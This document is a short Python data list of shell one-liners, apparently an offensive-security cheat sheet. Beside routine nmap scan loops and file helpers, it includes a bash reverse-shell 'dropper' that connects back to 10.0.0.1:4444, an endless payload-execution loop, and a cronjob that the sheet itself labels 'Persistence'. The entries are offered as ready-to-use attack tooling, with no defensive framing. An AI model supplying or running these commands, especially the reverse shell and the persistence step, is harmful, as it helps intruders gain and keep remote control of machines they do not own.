cheats = [
    {
        "command": "for ip in $(cat targets.txt); do nmap -sS $ip -oN $ip.txt; done",
        "description": "Scans each target in a file and saves results automatically.",
        "example": "→ Creates 1 report per target"
    },
    {
        "command": "echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' > shell.sh",
        "description": "Creates a dropper shell file in one line.",
        "example": "→ bash shell.sh"
    },
    {
        "command": "cat hosts.txt | xargs -I % sh -c 'echo Scanning %; nmap -Pn %'",
        "description": "Loops through hosts and runs nmap per IP with echo.",
        "example": "→ Clean looped scans"
    },
    {
        "command": "python3 -c \"import os; os.system('curl ifconfig.me')\"",
        "description": "Gets your public IP with a single-line Python script.",
        "example": "→ 1-liner recon script"
    },
    {
        "command": "while true; do ./payload.py; sleep 10; done",
        "description": "Runs a payload or script every 10 seconds endlessly.",
        "example": "→ Loop automation"
    },
    {
        "command": "find . -name '*.sh' -exec chmod +x {} \\;",
        "description": "Finds all scripts and makes them executable.",
        "example": "→ Auto prep tools in folder"
    },
    {
        "command": "python3 auto_reverse.py | tee reverse.log",
        "description": "Runs a script and logs all output to a file in real-time.",
        "example": "→ reverse.log stores everything"
    },
    {
        "command": "alias recon='bash recon.sh && cat report.txt'",
        "description": "Creates an alias to chain script and report view.",
        "example": "→ Type 'recon' to run full sweep"
    },
    {
        "command": "echo -e '#!/bin/bash\\nwhoami\\nip a' > scan.sh && chmod +x scan.sh",
        "description": "One-liner to create a Bash info grabber script.",
        "example": "→ Outputs user + IP info"
    },
    {
        "command": "crontab -e → */5 * * * * /home/user/scan.sh",
        "description": "Schedules a script to run every 5 mins (cronjob).",
        "example": "→ Persistence & scheduled actions"
    }
]
